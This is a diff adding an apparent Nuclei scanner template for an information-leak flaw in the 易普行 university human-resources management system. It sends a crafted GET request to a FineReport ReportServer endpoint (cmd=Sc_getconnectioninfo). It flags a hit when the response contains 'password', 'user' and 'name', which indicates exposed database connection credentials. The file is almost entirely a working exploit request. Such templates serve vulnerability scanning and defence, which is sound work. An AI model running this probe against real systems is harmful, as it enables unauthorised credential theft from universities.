@@ -1,0 +1,26 @@
+id: ypx-infoleak
+
+info:
+  name: 易普行-高校人力资源管理系统存在信息泄露漏洞
+  author: px-infolea
+  severity: high
+  tags: px-infolea
+
+http:
+  - raw:
+      - |
+        GET /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0 SeaMonkey/2.35
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'password'
+          - 'user'
+          - 'name'
+        condition: and
